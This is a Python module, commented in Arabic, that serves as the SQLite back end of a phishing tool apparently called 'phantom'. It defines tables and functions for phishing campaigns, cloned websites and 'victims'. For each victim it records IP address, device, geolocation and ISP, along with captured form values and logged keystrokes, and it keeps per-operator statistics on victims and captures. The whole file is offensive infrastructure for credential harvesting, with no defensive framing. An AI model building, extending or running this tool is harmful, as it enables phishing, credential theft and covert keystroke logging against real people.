#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sqlite3
import json
import threading
from datetime import datetime
from typing import List, Dict, Optional

class Database:
    def __init__(self, db_path="phantom.db"):
        self.db_path = db_path
        self.local = threading.local()
        self.init_db()
    
    def get_conn(self):
        if not hasattr(self.local, 'conn'):
            self.local.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self.local.conn.row_factory = sqlite3.Row
        return self.local.conn
    
    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        # جدول المستخدمين
        c.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                is_admin BOOLEAN DEFAULT 0,
                is_developer BOOLEAN DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                total_campaigns INTEGER DEFAULT 0,
                total_captures INTEGER DEFAULT 0
            )
        ''')
        
        # جدول الحملات
        c.execute('''
            CREATE TABLE IF NOT EXISTS campaigns (
                campaign_id TEXT PRIMARY KEY,
                name TEXT,
                platform TEXT,
                url TEXT,
                html_content TEXT,
                status TEXT DEFAULT 'active',
                created_by INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                captures INTEGER DEFAULT 0,
                settings TEXT
            )
        ''')
        
        # جدول الضحايا
        c.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                victim_id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id TEXT,
                session_id TEXT,
                ip_address TEXT,
                user_agent TEXT,
                device_type TEXT,
                os TEXT,
                browser TEXT,
                country TEXT,
                city TEXT,
                latitude REAL,
                longitude REAL,
                isp TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (campaign_id) REFERENCES campaigns (campaign_id)
            )
        ''')
        
        # جدول البيانات الملتقطة
        c.execute('''
            CREATE TABLE IF NOT EXISTS captures (
                capture_id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id INTEGER,
                field_type TEXT,
                field_name TEXT,
                field_value TEXT,
                page_url TEXT,
                metadata TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (victim_id) REFERENCES victims (victim_id)
            )
        ''')
        
        # جدول ضغطات المفاتيح
        c.execute('''
            CREATE TABLE IF NOT EXISTS keystrokes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id INTEGER,
                field_name TEXT,
                keystroke_data TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (victim_id) REFERENCES victims (victim_id)
            )
        ''')
        
        # جدول المواقع المستنسخة
        c.execute('''
            CREATE TABLE IF NOT EXISTS cloned_sites (
                site_id INTEGER PRIMARY KEY AUTOINCREMENT,
                original_url TEXT,
                local_path TEXT,
                status TEXT DEFAULT 'active',
                created_by INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
    
    # === المستخدمون ===
    
    def add_user(self, user_id: int, username: str, first_name: str, 
                 is_admin: bool = False, is_developer: bool = False):
        conn = self.get_conn()
        c = conn.cursor()
        c.execute('''
            INSERT OR REPLACE INTO users 
            (user_id, username, first_name, is_admin, is_developer, last_active)
            VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        ''', (user_id, username, first_name, is_admin, is_developer))
        conn.commit()
    
    def is_admin(self, user_id: int) -> bool:
        conn = self.get_conn()
        c = conn.cursor()
        c.execute("SELECT is_admin FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        return result and bool(result[0])
    
    def is_developer(self, user_id: int) -> bool:
        conn = self.get_conn()
        c = conn.cursor()
        c.execute("SELECT is_developer FROM users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        return result and bool(result[0])
    
    def get_user(self, user_id: int) -> Optional[Dict]:
        conn = self.get_conn()
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        row = c.fetchone()
        return dict(row) if row else None
    
    def get_all_users(self, limit: int = 100) -> List[Dict]:
        conn = self.get_conn()
        c = conn.cursor()
        c.execute("SELECT * FROM users ORDER BY created_at DESC LIMIT ?", (limit,))
        return [dict(row) for row in c.fetchall()]
    
    # === الحملات ===
    
    def create_campaign(self, campaign_id: str, name: str, platform: str, 
                       url: str, html_content: str, created_by: int, 
                       settings: Dict = None):
        conn = self.get_conn()
        c = conn.cursor()
        c.execute('''
            INSERT INTO campaigns 
            (campaign_id, name, platform, url, html_content, created_by, settings)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (campaign_id, name, platform, url, html_content, created_by,
              json.dumps(settings) if settings else None))
        
        # تحديث عداد المستخدم
        c.execute('''
            UPDATE users SET total_campaigns = total_campaigns + 1 
            WHERE user_id = ?
        ''', (created_by,))
        
        conn.commit()
    
    def get_campaign(self, campaign_id: str) -> Optional[Dict]:
        conn = self.get_conn()
        c = conn.cursor()
        c.execute("SELECT * FROM campaigns WHERE campaign_id = ?", (campaign_id,))
        row = c.fetchone()
        return dict(row) if row else None
    
    def get_campaign_html(self, campaign_id: str) -> Optional[str]:
        conn = self.get_conn()
        c = conn.cursor()
        c.execute("SELECT html_content FROM campaigns WHERE campaign_id = ?", (campaign_id,))
        row = c.fetchone()
        return row[0] if row else None
    
    def get_user_campaigns(self, user_id: int, limit: int = 50) -> List[Dict]:
        conn = self.get_conn()
        c = conn.cursor()
        c.execute('''
            SELECT * FROM campaigns 
            WHERE created_by = ? 
            ORDER BY created_at DESC 
            LIMIT ?
        ''', (user_id, limit))
        return [dict(row) for row in c.fetchall()]
    
    def get_all_campaigns(self, limit: int = 100) -> List[Dict]:
        conn = self.get_conn()
        c = conn.cursor()
        c.execute("SELECT * FROM campaigns ORDER BY created_at DESC LIMIT ?", (limit,))
        return [dict(row) for row in c.fetchall()]
    
    def update_campaign_stats(self, campaign_id: str, click: bool = False, capture: bool = False):
        conn = self.get_conn()
        c = conn.cursor()
        if click:
            c.execute("UPDATE campaigns SET clicks = clicks + 1 WHERE campaign_id = ?", (campaign_id,))
        if capture:
            c.execute("UPDATE campaigns SET captures = captures + 1 WHERE campaign_id = ?", (campaign_id,))
        conn.commit()
    
    def delete_campaign(self, campaign_id: str):
        conn = self.get_conn()
        c = conn.cursor()
        c.execute("DELETE FROM campaigns WHERE campaign_id = ?", (campaign_id,))
        conn.commit()
    
    # === الضحايا ===
    
    def create_victim(self, campaign_id: str, session_id: str, ip: str,
                     user_agent: str, device_info: Dict, geo_info: Dict) -> int:
        conn = self.get_conn()
        c = conn.cursor()
        
        c.execute('''
            SELECT victim_id FROM victims 
            WHERE campaign_id = ? AND session_id = ?
        ''', (campaign_id, session_id))
        existing = c.fetchone()
        
        if existing:
            c.execute('''
                UPDATE victims SET last_seen = CURRENT_TIMESTAMP 
                WHERE victim_id = ?
            ''', (existing[0],))
            conn.commit()
            return existing[0]
        
        c.execute('''
            INSERT INTO victims 
            (campaign_id, session_id, ip_address, user_agent, device_type,
             os, browser, country, city, latitude, longitude, isp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            campaign_id, session_id, ip, user_agent,
            device_info.get('device_type'), device_info.get('os'),
            device_info.get('browser'), geo_info.get('country'),
            geo_info.get('city'), geo_info.get('latitude'),
            geo_info.get('longitude'), geo_info.get('isp')
        ))
        conn.commit()
        return c.lastrowid
    
    def get_victim(self, victim_id: int) -> Optional[Dict]:
        conn = self.get_conn()
        c = conn.cursor()
        c.execute("SELECT * FROM victims WHERE victim_id = ?", (victim_id,))
        row = c.fetchone()
        return dict(row) if row else None
    
    def get_campaign_victims(self, campaign_id: str, limit: int = 100) -> List[Dict]:
        conn = self.get_conn()
        c = conn.cursor()
        c.execute('''
            SELECT * FROM victims 
            WHERE campaign_id = ? 
            ORDER BY last_seen DESC 
            LIMIT ?
        ''', (campaign_id, limit))
        return [dict(row) for row in c.fetchall()]
    
    # === التقاط البيانات ===
    
    def add_capture(self, victim_id: int, field_type: str, field_name: str,
                   field_value: str, page_url: str, metadata: Dict = None):
        conn = self.get_conn()
        c = conn.cursor()
        c.execute('''
            INSERT INTO captures 
            (victim_id, field_type, field_name, field_value, page_url, metadata)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (victim_id, field_type, field_name, field_value, page_url,
              json.dumps(metadata) if metadata else None))
        conn.commit()
    
    def get_victim_captures(self, victim_id: int) -> List[Dict]:
        conn = self.get_conn()
        c = conn.cursor()
        c.execute('''
            SELECT * FROM captures 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        return [dict(row) for row in c.fetchall()]
    
    def add_keystrokes(self, victim_id: int, field_name: str, keystroke_data: List):
        conn = self.get_conn()
        c = conn.cursor()
        c.execute('''
            INSERT INTO keystrokes (victim_id, field_name, keystroke_data)
            VALUES (?, ?, ?)
        ''', (victim_id, field_name, json.dumps(keystroke_data)))
        conn.commit()
    
    # === المواقع المستنسخة ===
    
    def add_cloned_site(self, original_url: str, local_path: str, created_by: int):
        conn = self.get_conn()
        c = conn.cursor()
        c.execute('''
            INSERT INTO cloned_sites (original_url, local_path, created_by)
            VALUES (?, ?, ?)
        ''', (original_url, local_path, created_by))
        conn.commit()
        return c.lastrowid
    
    def get_cloned_sites(self, user_id: int) -> List[Dict]:
        conn = self.get_conn()
        c = conn.cursor()
        c.execute('''
            SELECT * FROM cloned_sites 
            WHERE created_by = ? 
            ORDER BY created_at DESC
        ''', (user_id,))
        return [dict(row) for row in c.fetchall()]
    
    # === الإحصائيات ===
    
    def get_stats(self, user_id: int = None) -> Dict:
        conn = self.get_conn()
        c = conn.cursor()
        
        if user_id:
            c.execute("SELECT COUNT(*) FROM campaigns WHERE created_by = ?", (user_id,))
            campaigns = c.fetchone()[0]
            
            c.execute('''
                SELECT COUNT(*) FROM victims v
                JOIN campaigns c ON v.campaign_id = c.campaign_id
                WHERE c.created_by = ?
            ''', (user_id,))
            victims = c.fetchone()[0]
            
            c.execute('''
                SELECT COUNT(*) FROM captures cap
                JOIN victims v ON cap.victim_id = v.victim_id
                JOIN campaigns c ON v.campaign_id = c.campaign_id
                WHERE c.created_by = ?
            ''', (user_id,))
            captures = c.fetchone()[0]
        else:
            c.execute("SELECT COUNT(*) FROM campaigns")
            campaigns = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM victims")
            victims = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM captures")
            captures = c.fetchone()[0]
        
        return {
            'campaigns': campaigns,
            'victims': victims,
            'captures': captures
        }
    
    def get_global_stats(self) -> Dict:
        """إحصائيات عامة للمطور"""
        conn = self.get_conn()
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM campaigns")
        total_campaigns = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM victims")
        total_victims = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM captures")
        total_captures = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM campaigns WHERE status = 'active'")
        active_campaigns = c.fetchone()[0]
        
        # آخر 24 ساعة
        c.execute('''
            SELECT COUNT(*) FROM victims 
            WHERE first_seen >= datetime('now', '-1 day')
        ''')
        victims_24h = c.fetchone()[0]
        
        c.execute('''
            SELECT COUNT(*) FROM captures 
            WHERE timestamp >= datetime('now', '-1 day')
        ''')
        captures_24h = c.fetchone()[0]
        
        return {
            'total_users': total_users,
            'total_campaigns': total_campaigns,
            'total_victims': total_victims,
            'total_captures': total_captures,
            'active_campaigns': active_campaigns,
            'victims_24h': victims_24h,
            'captures_24h': captures_24h
        }

# كائن قاعدة البيانات العام
db = Database()
